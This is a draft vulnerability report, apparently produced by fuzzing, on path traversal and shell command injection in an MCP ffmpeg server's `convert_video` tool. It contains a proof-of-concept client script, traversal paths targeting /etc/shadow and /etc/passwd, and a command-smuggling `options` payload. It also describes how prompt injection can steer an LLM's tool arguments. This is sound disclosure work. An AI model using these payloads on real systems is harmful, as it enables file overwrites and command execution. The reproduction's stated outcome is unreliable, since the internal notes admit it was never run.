# Path traversal in `convert_video`: `inputPath` and `outputPath` are not confined, so the server creates directories and overwrites files anywhere

**Repository:** `sworddut/mcp-ffmpeg-helper` · **Tool:** `convert_video` · **Tested commit:** `d68d010`
**Weakness:** CWE-22 Path Traversal

## Summary
`convert_video` runs ffmpeg from `inputPath` to `outputPath`. Neither path is checked against a base directory, and `../` sequences and absolute paths are accepted. The server creates the output's parent directories and passes `-y`, so ffmpeg overwrites any existing file at that path without asking. A caller can read any media file the server user can read and write ffmpeg output anywhere that user can write.

## Details
`src/tools/handlers.ts:22-29`:

```ts
case "convert_video": {
  const inputPath = validatePath(String(args?.inputPath), true);
  const outputPath = validatePath(String(args?.outputPath));
  const options = String(args?.options || "");

  await ensureDirectoryExists(outputPath);
  const command = `-i "${inputPath}" ${options} "${outputPath}" -y`;
  const result = await runFFmpegCommand(command);
```

`validatePath` (`src/utils/file.ts:23-33`) checks only that the string is non-empty and, for the input, that it exists. `ensureDirectoryExists` (`src/utils/file.ts:8-18`) runs `mkdir(dirname(outputPath), { recursive: true })`. Neither function resolves the path or compares it with an allowed root.

A related, more serious problem sits in the same code path. `runFFmpegCommand` (`src/utils/ffmpeg.ts:33-40`) runs the string `ffmpeg ${command}` with `shell: true`. The paths are only wrapped in double quotes and `options` is inserted unquoted. A `"`, `` ` `` or `$(...)` in `outputPath`, or any shell metacharacter in `options`, is interpreted by `/bin/sh` (CWE-78). Building an argument array and calling `spawn("ffmpeg", args)` without a shell fixes both problems at once.

## Steps to reproduce
1. Prerequisites: Node.js (README: v14+) and `ffmpeg` on `PATH`. Create a test video and a working directory for the server:
   ```bash
   ffmpeg -f lavfi -i testsrc=duration=1:size=64x64:rate=1 -pix_fmt yuv420p /tmp/tofu-in.mp4
   mkdir -p /tmp/tofu-work/a/b/c
   ```
2. Install and build as the README describes:
   ```bash
   git clone https://github.com/sworddut/mcp-ffmpeg-helper.git
   cd mcp-ffmpeg-helper && npm install && npm run build
   ```
   The server is `node build/index.js`. The script below starts it with `/tmp/tofu-work/a/b/c` as its working directory.
3. Call the tool:
   ```json
   {"inputPath": "/tmp/tofu-in.mp4", "outputPath": "../../../../../../../../tmp/tofu-poc/convert.mp4", "options": ""}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="node",
           args=["/path/to/mcp-ffmpeg-helper/build/index.js"],
           cwd="/tmp/tofu-work/a/b/c",
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("convert_video", {
                   "inputPath": "/tmp/tofu-in.mp4",
                   "outputPath": "../../../../../../../../tmp/tofu-poc/convert.mp4",
                   "options": "",
               })
               print(result)

   asyncio.run(main())
   ```
4. Observe: `/tmp/tofu-poc/` is created and `/tmp/tofu-poc/convert.mp4` is written, outside the server's working directory. Run the script again and the file is overwritten without a prompt. An absolute `outputPath` works the same way.

## Expected behavior
Input and output paths are limited to a configured media or project directory. Paths that resolve outside it are rejected before any directory is created. Existing files are not overwritten unless the caller explicitly asks for it.

## Actual behavior
Any path is accepted. During fuzzing, traversal paths passed validation and stopped only because the sandbox had no input file to convert:

```
{'inputPath': 'video.mp4', 'outputPath': '../../../../etc/shadow', 'options': ''}
-> Error: Input file does not exist: video.mp4
{'inputPath': '../../../../etc/passwd', 'outputPath': 'output.mp4', 'options': ''}
-> Error: Input file does not exist: ../../../../etc/passwd
```

Nothing after the existence check would have stopped the traversal `outputPath`.

## Impact
The LLM chooses these arguments, and prompt injection in content it reads can steer them. An attacker can make the server create directories and write or overwrite files anywhere the user can write, for example replacing media in the user's home directory. ffmpeg picks the output format from the extension, so a file without a media extension normally fails. `options` accepts `-f <format>`, though, which removes that limit and allows any writable file to be overwritten with media bytes. That is an integrity and availability impact. It does not run code by itself. The shell problem described above is worse and should be treated as a separate finding.

## Suggested fix
- Add an allowed root, for example a CLI argument or env var that defaults to the working directory. Resolve `inputPath` with `fs.realpathSync` and `outputPath` with `path.resolve` (after resolving its parent with `realpath`). Reject either one unless it is inside the root.
- Replace the unconditional `-y` with `-n`, or add an explicit `overwrite` argument.
- Build an argv array and call `spawn("ffmpeg", argv)` without `shell: true`. Split `options` into tokens, and preferably check them against an allow-list.

## Status on the default branch
Still present at `d68d010` (2026-01-04). The tested commit is the current default branch head.

## Prior reports
- #6 "Security: OS command injection via unsanitized tool arguments in runFFmpegCommand (shell:true)" (issue, open 2026-07-11): reports the `shell: true` command injection that this draft mentions under Details (it names `convert_video` `options`). It notes that `validatePath()` only checks existence but does not report path traversal or missing confinement. No fix: the default branch head `d68d010` (2026-01-04) predates it.
- Documentation: README.md: "C:/Users/username/videos/long_video.mp4" (the usage examples pass absolute paths under the user's home, and troubleshooting says only to make sure the app has permission for the given files and directories; there is no security section and no allowed-directory setting, so unconfined paths look like the intended contract)

<details>
<summary>Internal notes (remove before filing)</summary>

- DUPLICATE/FIXED CHECK: CWE-22 not reported anywhere; the CWE-78 shell problem mentioned in Details is already reported as #6 (open, unfixed), so do not file it again as a new issue.
- ToFu class / sanitizers: path-traversal (CWE-22); `check_path_traversal` (evidence), `check_reflected_output` also fired on this tool.
- Campaigns and executions: corpus-sbx 3584 exec / 3584 ok; e2-0922 1 exec / 1 ok (60 s budgets).
- Evidence (verbatim, trimmed):
  - `{'inputPath': '/etc/passwd\x00', 'outputPath': 'out.mov', 'options': ''}` -> `Error: Input file does not exist: /etc/passwd\x00`
  - `{'inputPath': 'video.mp4', 'outputPath': '../../../../etc/shadow', 'options': ''}` -> `Error: Input file does not exist: video.mp4`
  - `{'inputPath': '../../../../etc/passwd', 'outputPath': 'output.mp4', 'options': ''}` -> `Error: Input file does not exist: ../../../../etc/passwd`
- Hand-check hints: weak as CWE-22. There is no containment (confirmed in source), but the server defines no intended directory, and the README examples use absolute paths. Every evidence call stopped at the input existence check, so no traversal write was observed. The real issue in this code is CWE-78: `shell: true` plus string interpolation (`src/utils/ffmpeg.ts:36-40`, `handlers.ts:28`). It deserves its own report. A harmless PoC idea for that report, derived from the code and not run: `{"inputPath": "/tmp/tofu-in.mp4", "outputPath": "/tmp/tofu-poc/out.mp4", "options": "-t 1; id > /tmp/tofu-poc.txt; echo"}` should write `id` output to `/tmp/tofu-poc.txt`. Same root cause as the other 7 drafts for this repo; consider one consolidated path issue plus one CWE-78 issue. The reproduction above was derived from the code and has not been run.
</details>
